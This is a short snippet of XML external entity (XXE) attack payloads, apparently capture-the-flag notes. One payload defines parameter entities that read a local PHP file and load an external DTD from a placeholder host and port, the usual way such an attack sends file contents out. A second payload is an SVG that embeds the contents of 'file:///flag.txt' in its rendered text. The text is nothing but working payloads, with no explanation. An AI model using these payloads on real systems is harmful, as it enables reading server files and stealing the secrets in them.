<!DOCTYPE < [
<!ENTITY % begin "<![CDATA[">
<!ENTITY % file SYSTEM "file:///FILE.php">
<!ENTITY % end "]]>">
<!ENTITY % xxe SYSTEM "http://<LOCALHOST>:<PORT>/xxe.dtd">
%xxe;
]>

XXE SVG:

<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///flag.txt" > ]><svg width="400px" height="400px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
